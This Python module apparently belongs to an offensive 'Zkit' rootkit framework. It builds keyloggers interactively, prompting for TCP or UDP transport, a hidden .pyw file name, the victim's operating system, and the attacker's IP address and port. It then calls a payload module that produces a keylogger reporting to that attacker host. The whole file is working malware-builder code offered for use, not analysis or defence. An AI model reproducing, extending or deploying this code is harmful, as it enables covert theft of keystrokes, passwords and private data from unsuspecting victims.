"Zkit Framework Rootkit generator . this module talks to _get_rootkit"
import socket as s
import sys
from core.helper_core import Color, create_file, notify, ask_for # pylint: disable=C0415; # noqa
from core.lib.randoms import random_str
def get_keylogger():
    "Gets rootkit . talks with rootkit modules"
    k_path = sys.path[0] + "\\Builded\\KeyLogger\\"
    _, red, green, _, blue, _, _, _, reset = Color().GetAllColors()

    print(
        "A " + red + "KeyLogger" + reset + " ?"
        + "What is The Connection Type : \n"
        + red + "{1}--> TCP\n"
        + green + "{2}--> UDP\n"
        + blue + "{000}--> Back To Main Menu" + reset
    )
    choice = str(input("..> ")).replace("1", "TCP").replace("2", "UDP")

    if choice == "000":
        pass

    elif choice in("TCP", "UDP"):
        # Getting Some Required Information : PATH Of Rootkit , Attacker_Ip : Ip or
        # Domain to Send data to it
        # Attacker_Port : An open port on attacker machine

        # Getting File PATH
        u_path = k_path + ask_for("Enter A Name For Your File .\nIt Will Be --> {}".format(k_path) +
                                  "YOUR_FILE_NAME.pyw : ", 'Using \\| As File Path',) + ".pyw"

        # Very important
        notify("question",
               "Whats Your Victim(s) Operating System(s)" + red +
               " {W}indows" + green + " {L}inux" + reset

               )
        victim_os = str(input("..> ")).upper()

        if victim_os == "000":
            pass

        elif victim_os in ["W", "L"]:
            victim_os = victim_os.replace("W", "WINDOWS", -1)
            victim_os = victim_os.replace("L", "LINUX", -1)
            # Getting Attacker ip
            attacker_ip = ask_for("Whats You IP Address, Host Name Or Domain Name " +
                                  "Left it to empty to use your own hostname (automic) : ",
                                  "Using IP \\| As Attacker_ip", default=['', s.gethostbyname],
                                  args=s.gethostname()
                                  )
            # Getting an open port on attacker port

            attacker_port = ask_for("Whats An Open Port In Your Machine " +
                                    "Left It '-1' To Use Default Port (1534 Eclipse's "
                                    "default communicate port) : ", "Using \\| As Attacker_Port",
                                    default=[-1, 1534], type=int,
                                    )
            strs = []
            # generating more then need
            for _ in range(0, 6):
                strs.append(random_str())
            if choice == 'TCP':
                import core.lib.payloads.keylogger.tcp as k # pylint: disable=C0415; # noqa
            elif choice == 'UDP':
                import core.lib.payloads.keylogger.udp as k # pylint: disable=C0415; # noqa

            return (k._get_keylogger( # pylint: disable=W0212; # noqa
                attacker_ip, attacker_port, victim_os, strs), create_file(u_path))
    else:
        print("Port is either TCP or UDP but yours is not one.try again")
    return ("Error", "BadInput")
